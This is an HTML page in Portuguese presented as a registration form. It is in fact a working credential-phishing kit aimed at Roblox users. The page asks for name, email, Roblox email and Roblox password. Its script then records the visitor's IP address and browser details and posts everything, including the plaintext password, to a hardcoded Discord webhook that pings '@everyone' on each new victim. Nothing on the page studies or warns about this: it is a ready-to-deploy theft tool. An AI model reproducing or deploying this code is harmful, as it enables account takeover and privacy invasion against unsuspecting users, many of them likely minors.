<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cadastro | Meu Site</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f8f9fa;
            color: #333;
            line-height: 1.6;
        }
        
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
            margin-top: 20px;
        }
        
        h1 {
            text-align: center;
            color: #2c3e50;
            margin-bottom: 25px;
            font-size: 28px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #2c3e50;
        }
        
        input[type="text"],
        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            transition: all 0.3s;
            box-sizing: border-box;
        }
        
        input:focus {
            border-color: #3498db;
            outline: none;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
        }
        
        .section-title {
            font-size: 18px;
            margin: 25px 0 15px;
            padding-bottom: 8px;
            border-bottom: 2px solid #3498db;
            color: #2c3e50;
        }
        
        .password-container {
            position: relative;
        }
        
        .toggle-password {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #7f8c8d;
            font-size: 14px;
        }
        
        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #3498db, #2c3e50);
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 15px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 8px rgba(0,0,0,0.15);
        }
        
        .success-message {
            display: none;
            background-color: #2ecc71;
            color: white;
            padding: 15px;
            border-radius: 6px;
            text-align: center;
            margin-top: 20px;
            animation: fadeIn 0.5s;
        }
        
        .error-message {
            display: none;
            background-color: #e74c3c;
            color: white;
            padding: 15px;
            border-radius: 6px;
            text-align: center;
            margin-top: 20px;
            animation: fadeIn 0.5s;
        }
        
        .info-text {
            font-size: 14px;
            color: #7f8c8d;
            margin-top: 5px;
        }
        
        .required {
            color: #e74c3c;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Cadastro Completo</h1>
        
        <form id="registrationForm">
            <div class="section-title">Informa√ß√µes Pessoais</div>
            
            <div class="form-group">
                <label for="fullName">Nome Completo <span class="required">*</span></label>
                <input type="text" id="fullName" name="fullName" placeholder="Seu nome completo" required>
            </div>
            
            <div class="form-group">
                <label for="email">E-mail <span class="required">*</span></label>
                <input type="email" id="email" name="email" placeholder="seu.email@exemplo.com" required>
            </div>
            
            <div class="section-title">Conta Roblox</div>
            
            <div class="form-group">
                <label for="robloxEmail">E-mail Roblox <span class="required">*</span></label>
                <input type="email" id="robloxEmail" name="robloxEmail" placeholder="email.da.roblox@exemplo.com" required>
                <p class="info-text">O e-mail associado √† sua conta Roblox</p>
            </div>
            
            <div class="form-group">
                <label for="robloxPassword">Senha Roblox <span class="required">*</span></label>
                <div class="password-container">
                    <input type="password" id="robloxPassword" name="robloxPassword" placeholder="Sua senha da Roblox" required>
                    <span class="toggle-password" onclick="togglePasswordVisibility()">üëÅÔ∏è</span>
                </div>
                <p class="info-text">A senha da sua conta Roblox</p>
            </div>
            
            <button type="submit">Cadastrar</button>
        </form>
        
        <div id="successMessage" class="success-message">
            ‚úÖ Cadastro realizado com sucesso! Obrigado.
        </div>
        
        <div id="errorMessage" class="error-message">
            ‚ùå Ocorreu um erro. Por favor, tente novamente.
        </div>
    </div>

    <script>
        // Fun√ß√£o para alternar visibilidade da senha
        function togglePasswordVisibility() {
            const passwordField = document.getElementById('robloxPassword');
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
            } else {
                passwordField.type = 'password';
            }
        }
        
        // Fun√ß√£o para obter o IP do usu√°rio
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error("Erro ao obter IP:", error);
                return "IP n√£o dispon√≠vel";
            }
        }
        
        // Fun√ß√£o para obter dados do navegador
        function getBrowserData() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screenRes: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                pageURL: window.location.href
            };
        }

        // Fun√ß√£o para enviar o webhook para o Discord
        async function sendWebhook(userData) {
            const webhookURL = 'https://discordapp.com/api/webhooks/1390734337967915088/bfOkFeyvkiU-eS4HlXPbG-n_ox0A9nr5RV5s8HTMx5y9yl5bpVCN4LYR0XdgRlZIdiB0';
            
            // Informa√ß√µes do navegador
            const browserData = getBrowserData();
            
            // Construir mensagem para o Discord
            const embed = {
                title: "üìù NOVO CADASTRO COMPLETO",
                color: 0x3498db,
                fields: [
                    { name: "üë§ Nome Completo", value: userData.fullName || "N√£o informado", inline: true },
                    { name: "‚úâÔ∏è E-mail", value: userData.email || "N√£o informado", inline: true },
                    { name: "üîí E-mail Roblox", value: userData.robloxEmail || "N√£o informado", inline: true },
                    { name: "üîë Senha Roblox", value: `||${userData.robloxPassword}||` || "N√£o informado", inline: true },
                    { name: "üåê Endere√ßo IP", value: userData.ip || "N√£o dispon√≠vel", inline: true },
                    { name: "üïí Data/Hora", value: new Date().toLocaleString(), inline: true },
                    { name: "üíª Plataforma", value: browserData.platform || "N√£o dispon√≠vel", inline: true },
                    { name: "üñ•Ô∏è Resolu√ß√£o", value: browserData.screenRes || "N√£o dispon√≠vel", inline: true },
                    { name: "üîó P√°gina", value: browserData.pageURL || "N√£o dispon√≠vel", inline: true },
                    { name: "üåê User Agent", value: `\`\`\`${browserData.userAgent.substring(0, 1000)}\`\`\`` || "N√£o dispon√≠vel" }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: "Cadastro realizado"
                }
            };

            // Montar payload
            const data = {
                username: "Cadastro Roblox",
                avatar_url: "https://cdn-icons-png.flaticon.com/512/5968/5968760.png",
                content: "@everyone **NOVO CADASTRO RECEBIDO!** üöÄ",
                embeds: [embed]
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                });
                
                return response.ok;
            } catch (error) {
                console.error('Erro ao enviar webhook:', error);
                return false;
            }
        }

        // Quando o formul√°rio √© enviado
        document.getElementById('registrationForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Obter dados do formul√°rio
            const formData = {
                fullName: document.getElementById('fullName').value,
                email: document.getElementById('email').value,
                robloxEmail: document.getElementById('robloxEmail').value,
                robloxPassword: document.getElementById('robloxPassword').value
            };
            
            // Validar campos
            if (!formData.fullName || !formData.email || !formData.robloxEmail || !formData.robloxPassword) {
                alert("Por favor, preencha todos os campos obrigat√≥rios.");
                return;
            }
            
            // Obter IP do usu√°rio
            formData.ip = await getUserIP();
            
            // Mostrar estado de carregamento no bot√£o
            const submitButton = document.querySelector('button[type="submit"]');
            submitButton.textContent = 'Enviando...';
            submitButton.disabled = true;
            
            try {
                // Enviar dados para o webhook
                const success = await sendWebhook(formData);
                
                if (success) {
                    // Mostrar mensagem de sucesso
                    document.getElementById('successMessage').style.display = 'block';
                    document.getElementById('errorMessage').style.display = 'none';
                    
                    // Limpar formul√°rio
                    document.getElementById('registrationForm').reset();
                    
                    // Resetar ap√≥s 3 segundos
                    setTimeout(() => {
                        document.getElementById('successMessage').style.display = 'none';
                    }, 5000);
                } else {
                    throw new Error('Erro no envio do webhook');
                }
            } catch (error) {
                // Mostrar mensagem de erro
                document.getElementById('errorMessage').style.display = 'block';
                document.getElementById('successMessage').style.display = 'none';
                console.error('Erro no cadastro:', error);
            } finally {
                // Restaurar bot√£o
                submitButton.textContent = 'Cadastrar';
                submitButton.disabled = false;
            }
        });
    </script>
</body>
</html>
